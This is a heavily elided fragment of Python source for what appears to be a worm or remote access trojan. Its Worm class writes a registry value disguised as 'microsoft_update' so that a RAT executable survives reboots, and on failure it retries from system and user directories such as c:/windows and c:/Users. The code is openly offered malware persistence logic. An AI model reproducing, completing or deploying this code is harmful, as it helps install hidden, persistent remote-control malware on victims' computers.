...
# add your directory list
DIRECTORY = ['c:/aaa', 'c:/windows', 'c:/Users']
...
class Worm:
    ...
    def registry_add(self):
        try:
            ...
            winreg.SetValueEx(new_key, "microsoft_update", 0, winreg.REG_SZ, self.location)
        ...
        if error:
            ...
            for d in DIRECTORY:
                ...
                try:
                    ...
                    self.location = f'"{d}{EXE_RAT}"'.replace('/', '\\')
                    self.registry_add()
                    break
                except:
                    continue
